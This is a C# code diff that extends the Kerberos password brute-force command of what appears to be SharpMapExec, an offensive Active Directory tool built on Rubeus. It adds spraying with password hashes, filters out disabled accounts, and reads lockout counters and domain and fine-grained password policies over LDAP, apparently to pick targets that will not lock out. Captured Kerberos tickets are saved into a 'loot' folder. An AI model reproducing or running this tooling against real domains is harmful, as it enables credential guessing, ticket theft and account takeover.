@@ -1,4 +1,5 @@
 ﻿using Rubeus;
+using SharpMapExec.Lib;
 using System;
 using System.Collections;
 using System.Collections.Generic;
@@ -16,7 +17,8 @@ namespace SharpMapExec.Commands
 
         private string domain = "";
         private string[] usernames = null;
-        private string[] passwords = null;
+        private string[] passwords = new string[] { };
+        private string[] hashes = new string[] { };
         private string dc = "";
         private string ou = "";
         private string credUser = "";
@@ -36,17 +38,24 @@ namespace SharpMapExec.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
+            
             Console.WriteLine("\r\n[*] Action: Perform Kerberos Brute Force\r\n");
             try
             {
                 this.ParseArguments(arguments);
+                if (this.passwords.Length == 0 && this.hashes.Length == 0)
+                {
+                    throw new BruteArgumentException("[X] You must supply a secret! Use /password:<password> or /passwords:<file> or /hash:<hash> or /hashes:<file>");
+                }
                 this.ObtainUsers();
 
-                IBruteforcerReporter consoleReporter = new BruteforceConsoleReporter(
-                    this.outfile, this.verbose, this.saveTickets);
+                IBruteforcerReporter consoleReporter = new BruteforceConsoleReporter(this.outfile, this.verbose, this.saveTickets);
+
+                Console.WriteLine("Continue?");
+                string a = Console.ReadLine();
 
                 Bruteforcer bruter = new Bruteforcer(this.domain, this.dc, consoleReporter);
-                bool success = bruter.Attack(this.usernames, this.passwords);
+                bool success = bruter.Attack(this.usernames, this.passwords, this.hashes);
                 if (success)
                 {
                     if (!String.IsNullOrEmpty(this.outfile))
@@ -80,6 +89,7 @@ namespace SharpMapExec.Commands
             this.ParseDC(arguments);
             this.ParseCreds(arguments);
             this.ParsePasswords(arguments);
+            this.ParseHashes(arguments);
             this.ParseUsers(arguments);
             this.ParseOutfile(arguments);
             this.ParseVerbose(arguments);
@@ -158,11 +168,35 @@ namespace SharpMapExec.Commands
             {
                 this.passwords = new string[] { arguments["/password"] };
             }
-            else
+            //else
+            //{
+            //    throw new BruteArgumentException(
+            //        "[X] You must supply a password! Use /password:<password> or /passwords:<file>");
+            //}
+        }
+
+        private void ParseHashes(Dictionary<string, string> arguments)
+        {
+            if (arguments.ContainsKey("/hashes"))
             {
-                throw new BruteArgumentException(
-                    "[X] You must supply a password! Use /password:<password> or /passwords:<file>");
+                try
+                {
+                    this.hashes = File.ReadAllLines(arguments["/hashes"]);
+                }
+                catch (FileNotFoundException)
+                {
+                    throw new BruteArgumentException("[X] Unable to open hashes file \"" + arguments["/hashes"] + "\": Not found file");
+                }
             }
+            else if (arguments.ContainsKey("/hash"))
+            {
+                this.hashes = new string[] { arguments["/hash"] };
+            }
+            //else
+            //{
+            //    throw new BruteArgumentException(
+            //        "[X] You must supply a password! Use /hash:<hash> or /hashes:<file>");
+            //}
         }
 
         private void ParseUsers(Dictionary<string, string> arguments)
@@ -223,6 +257,7 @@ namespace SharpMapExec.Commands
             }
         }
 
+
         private string[] DomainUsernames()
         {
 
@@ -245,10 +280,25 @@ namespace SharpMapExec.Commands
                 Console.WriteLine("[*] Using alternate creds  : {0}\r\n", userDomain);
             }
 
-
+            //user list
+            List<UserInfo> Users = new List<UserInfo>();
             DirectorySearcher userSearcher = new DirectorySearcher(directoryObject);
-            userSearcher.Filter = "(samAccountType=805306368)";
-            userSearcher.PropertiesToLoad.Add("samAccountName");
+            userSearcher.Filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))";
+            userSearcher.PropertiesToLoad.Add("sAMAccountName");
+            userSearcher.PropertiesToLoad.Add("badPwdCount");
+            userSearcher.PropertiesToLoad.Add("badPasswordTime");
+            userSearcher.PropertiesToLoad.Add("lockoutTime");
+            userSearcher.PropertiesToLoad.Add("lockoutDuration");
+            userSearcher.PropertiesToLoad.Add("pwdLastSet");
+            userSearcher.SearchScope = SearchScope.Subtree;
+
+            //pass policy
+            List<LDAPPasswordPolicy> Policies = new List<LDAPPasswordPolicy>();
+            Policies.Add(Domain.GetDomainPolicy(directoryObject));
+
+            var fineGrainedPolicies = Domain.GetFineGrainedPolicies(directoryObject);
+            fineGrainedPolicies.ForEach(x => x.AppliesToUsers = Domain.GetPasswordPolicyUsers(x, directoryObject));
+            Policies.AddRange(fineGrainedPolicies);
 
             try
             {
@@ -260,9 +310,23 @@ namespace SharpMapExec.Commands
                 {
                     string username = user.Properties["samAccountName"][0].ToString();
                     usernames.Add(username);
+
+                    LDAPPasswordPolicy policy;
+                    var user2 = new LDAPUserInfo(user);
+                    policy = user2.GetUserPolicy(Policies);
+                    user2 = user2.ClassifyUser(policy);
+                    Users.Add(user2);
                 }
 
-                return usernames.Cast<object>().Select(x => x.ToString()).ToArray();
+                Console.WriteLine($"Password Policy Count: ({Policies.Count}):");
+                foreach (var policy in Policies.OrderBy(x => x.PasswordPrecendence))
+                {
+                    Domain.DisplayPolicyDetails(Policies[0], Policies, Users);
+                    Console.WriteLine($"-----------------------------------");
+                }
+
+                return Domain.GetList(Policies, Users);
+                //return usernames.Cast<object>().Select(x => x.ToString()).ToArray();
             }
             catch (System.Runtime.InteropServices.COMException ex)
             {
@@ -416,7 +480,7 @@ namespace SharpMapExec.Commands
         {
             if (this.saveTicket)
             {
-                string ticketFilename = username + ".kirbi";
+                string ticketFilename = Path.Combine("loot", username + ".kirbi");
                 File.WriteAllBytes(ticketFilename, ticket);
                 Console.WriteLine("[*] Saved TGT into {0}", ticketFilename);
             }
